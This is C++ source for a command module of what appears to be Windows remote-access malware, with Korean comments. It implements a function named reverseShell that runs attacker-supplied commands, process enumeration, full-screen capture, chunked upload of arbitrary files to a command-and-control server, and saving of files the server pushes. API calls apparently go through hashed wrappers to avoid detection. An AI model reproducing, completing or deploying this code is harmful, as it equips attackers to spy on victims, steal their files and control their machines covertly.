#include <Windows.h>
#include <iostream>
#include <ole2.h>
#include <olectl.h>
#include <Psapi.h>
#include <tchar.h>
#include <map>

#include "commandManager.h"
#include "cncManager.h"
#include "DDproto.h"
#include "HashFunction_command.h"

commandManager::commandManager() {
}

std::string commandManager::reverseShell(std::string cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd.c_str(), "r");

    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL)
            result += buffer;
    }
    catch ( ... ) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);
    return result;
}

// pid에 해당하는 모듈 이름을 리턴
std::wstring commandManager::pidToName(DWORD procID) {
    TCHAR procName[MAX_PATH] = L"";

    HANDLE hProc = OpenProcess_c(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, procID); // pid에 해당하는 모듈의 handle get

    if (NULL != hProc) {
        HMODULE hModule;
        DWORD resultLen;

        if (EnumProcessModules_c(hProc, &hModule, sizeof(hModule), &resultLen)) {
            GetModuleBaseNameW_c(hProc, hModule, procName, sizeof(procName) / sizeof(TCHAR));
        }
    }

    std::wstring result = procName;

    CloseHandle_c(hProc);

    return result;
}

// <pid, module name> 형태로 반환
std::map<DWORD, std::wstring> commandManager::getProcessList() {
    std::map<DWORD, std::wstring> procDict;

    DWORD procIDList[1024];
    DWORD byteLen;

    std::wstring pName = L"";

    // pid 얻어오기
    if (!EnumProcesses_c(procIDList, sizeof(procIDList), &byteLen)) {
        // TODO Fail Logic
        return procDict;
    }

    DWORD count = byteLen / sizeof(DWORD);

    // pid와 대응하는 모듈 이름을 얻어옴
    for (DWORD i = 0; i < count; i++) {
        if (procIDList[i] != 0) {
            pName = commandManager::pidToName(procIDList[i]);
            if (pName != L"")
                procDict.insert({ procIDList[i],  pName });
        }
    }

    /*
    for (auto process : procDict) {
        wprintf(L"%40s(%d)\n", process.second.c_str(), process.first);
    }
    */

    return procDict;
}


/* 화면 스샷 구현용 WriteFile 삭제하고 Stream을 바로 sendData로 넘겨줘야할듯*/
LPVOID commandManager::getScreen() {
    {
        int w = GetSystemMetrics_c(SM_CXVIRTUALSCREEN);
        int h = GetSystemMetrics_c(SM_CYVIRTUALSCREEN);
        HDC hdcSource = GetDC_c(NULL);
        HDC hdcMemory = CreateCompatibleDC_c(hdcSource);

        int capX = GetDeviceCaps_c(hdcSource, HORZRES);
        int capY = GetDeviceCaps_c(hdcSource, VERTRES);

        HBITMAP hBitmap = CreateCompatibleBitmap_c(hdcSource, w, h);

        HBITMAP hBitmapOld = (HBITMAP)SelectObject_c(hdcMemory, hBitmap);

        BitBlt_c(hdcMemory, 0, 0, w, h, hdcSource, 0, 0, SRCCOPY);

        hBitmap = (HBITMAP)SelectObject_c(hdcMemory, hBitmapOld);

        DeleteDC_c(hdcSource);
        DeleteDC_c(hdcMemory);

        HPALETTE hpal = NULL;

        PICTDESC pd;

        pd.cbSizeofstruct = sizeof(PICTDESC);
        pd.picType = PICTYPE_BITMAP;
        pd.bmp.hbitmap = hBitmap;
        pd.bmp.hpal = hpal;

        LPPICTURE picture;
        HRESULT res = OleCreatePictureIndirect(&pd, IID_IPicture, false,
            reinterpret_cast<void**>(&picture));

        LPSTREAM stream;
        res = CreateStreamOnHGlobal(0, true, &stream);


        LONG bytes_streamed;
        res = picture->SaveAsFile(stream, true, &bytes_streamed);

        HGLOBAL mem = 0;
        GetHGlobalFromStream(stream, &mem);
        LPVOID data = GlobalLock_c(mem);

        this->screen_len = bytes_streamed;

        UCHAR* ptr = new UCHAR[this->screen_len];
        memset(ptr, 0, this->screen_len);
        memcpy(ptr, data, this->screen_len);


        GlobalUnlock_c(mem);

        stream->Release();
        picture->Release();

        return (LPVOID)ptr;
    }
}

void commandManager::getFile(std::string& path, LPCWSTR server) {
    std::cout << path << std::endl;
    cncManager client(server);
    FILE* fp = NULL;
    UCHAR* buffer = new UCHAR[sizeof(DDprotocol) + DATA_BUF_SIZE]; //450MB
    memset(buffer, 0, sizeof(DDprotocol) + DATA_BUF_SIZE);
    DWORD sequence = 0;
    ULONG64 size = 0;

    DDprotocol* dataFrame = new DDprotocol;
    dataFrame->type = ftpResponse;
    dataFrame->seq = 0;

    fopen_s(&fp, path.c_str(), "rb+");
    if (fp) {
        while (!feof(fp)) {
            size = fread(buffer + sizeof(DDprotocol), 1, DATA_BUF_SIZE, fp);

            if (sequence == 0 && size < DATA_BUF_SIZE) {
                dataFrame->len = size;
                dataFrame->seq = 0;
                memcpy(buffer, dataFrame, sizeof(DDprotocol));
                client.sendHttpRequest((LPVOID)buffer, sizeof(DDprotocol) + size);
                break;
            }
            else if (size == DATA_BUF_SIZE) {
                sequence++;
                dataFrame->len = size;
                dataFrame->seq = sequence;
                std::cout << dataFrame->seq << std::endl;
                memcpy(buffer, dataFrame, sizeof(DDprotocol));
                client.sendHttpRequest((LPVOID)buffer, sizeof(DDprotocol) + size);
            }
            else if (sequence != 0 && size < DATA_BUF_SIZE) {
                sequence++;
                dataFrame->len = size;
                dataFrame->seq = LAST_SPLITED_SEQ;
                std::cout << dataFrame->seq << std::endl;
                memcpy(buffer, dataFrame, sizeof(DDprotocol));
                client.sendHttpRequest((LPVOID)buffer, sizeof(DDprotocol) + size);
            }



        }
        fclose(fp);
    }
    // 파일을 못찾을 시 error 전송
    else
    {
        std::string file_err = std::to_string(SENDING_FILE_ERROR);
        client.sendData(error, file_err.size(), (LPVOID)file_err.c_str());
    }
    delete dataFrame;
    delete[] buffer;

}

void commandManager::saveFile(FILE* &fp, std::string& path, LPVOID data, DWORD seq, DWORD len) {
    if (!fp) {
        fopen_s(&fp, path.c_str(), "wb+");
    }

    fwrite(data, 1, len, fp);

    if (seq == NOT_SPLITED_SEQ || seq == LAST_SPLITED_SEQ) {
        fclose(fp);
        fp = NULL;
    }
       
}